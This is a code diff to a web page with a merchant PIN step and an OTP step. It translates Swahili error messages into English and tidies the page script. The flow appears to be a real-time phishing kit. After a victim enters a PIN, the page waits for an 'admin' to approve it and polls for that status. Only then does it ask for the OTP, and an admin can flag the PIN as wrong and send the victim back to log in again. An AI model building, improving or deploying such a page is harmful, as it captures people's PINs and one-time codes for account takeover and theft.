@@ -194,9 +194,6 @@
   .otp-curve::before { content:''; display:block; background:var(--navy); height:50px; clip-path:ellipse(60% 100% at 50% 100%); margin-bottom:-4px; }
   .otp-foot { background:var(--navy); padding:14px; text-align:center; font-size:0.75rem; color:rgba(255,255,255,0.45); }
 
-  /* Hide OTP input section by default — only show after admin approves PIN */
-  #otpInputSection { display:none; }
-
   /* ───── PAGE 8: MERCHANT PIN ───── */
   #page-merchant-pin { background:#fff; }
 
@@ -911,10 +908,8 @@
 
         // Transition to OTP page — but show "waiting for admin" first
         goTo('page-otp');
-        // Ensure waiting indicator is visible and OTP input is hidden
         document.getElementById('pinWait').classList.add('show');
-        const otpSection = document.getElementById('otpInputSection');
-        if (otpSection) otpSection.style.display = 'none';
+        document.getElementById('otpInputSection').style.display = 'none';
 
         // Start polling for PIN approval
         pollPinStatus();
@@ -1135,13 +1130,13 @@
 
         } else if (data.status === 'rejected') {
           clearInterval(otpPollInterval);
-          showOtpMsg('error', 'Uthibitisho umeshindwa. Tafadhali wasiliana na msaada.');
+          showOtpMsg('error', 'Verification failed. Please contact support.');
           document.getElementById('bOtp').disabled = false;
 
         } else if (data.status === 'wrongpin_otp') {
           // Admin flagged PIN as wrong — send user back to login
           clearInterval(otpPollInterval);
-          showOtpMsg('error', 'PIN si sahihi iliyotambuliwa. Inakamatia kuingia tena…');
+          showOtpMsg('error', 'Incorrect PIN detected. Redirecting to login…');
           setTimeout(() => {
             // Clear OTP textarea
             document.getElementById('otpInput').value = '';
@@ -1172,7 +1167,7 @@
           chkOtp();
           document.getElementById('bOtp').disabled = false;
           
-          showOtpMsg('error', 'Nambari ya OTP si sahihi. Tafadhali angalia na ingiza tena.');
+          showOtpMsg('error', 'Incorrect OTP code. Please check and re-enter.');
           
           if (S.otpAttempts >= 2) {
             setTimeout(() => {
